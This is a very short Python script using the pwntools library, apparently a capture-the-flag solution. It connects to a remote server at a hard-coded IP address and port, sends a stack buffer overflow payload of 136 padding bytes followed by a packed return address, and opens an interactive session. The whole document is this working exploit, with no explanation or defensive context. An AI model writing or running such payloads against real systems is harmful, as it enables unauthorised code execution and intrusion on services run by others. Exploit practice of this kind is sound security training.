from pwn import *

io = remote('111.200.241.244', 49637)
payload = b'A' * 136 + p64(0x400596)
io.recv()
io.send(payload)
io.interactive()